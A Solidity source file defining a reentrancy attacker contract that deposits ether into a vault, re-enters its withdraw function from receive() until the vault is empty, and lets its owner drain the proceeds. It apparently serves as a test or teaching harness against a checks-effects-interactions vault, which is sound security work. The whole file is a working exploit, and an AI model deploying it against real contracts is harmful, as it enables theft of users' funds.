// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CEIVault.sol";

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address user) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVault public vault;
    address public owner;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    receive() external payable {
        attackCount++;
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function getEtherBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function drainToOwner() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}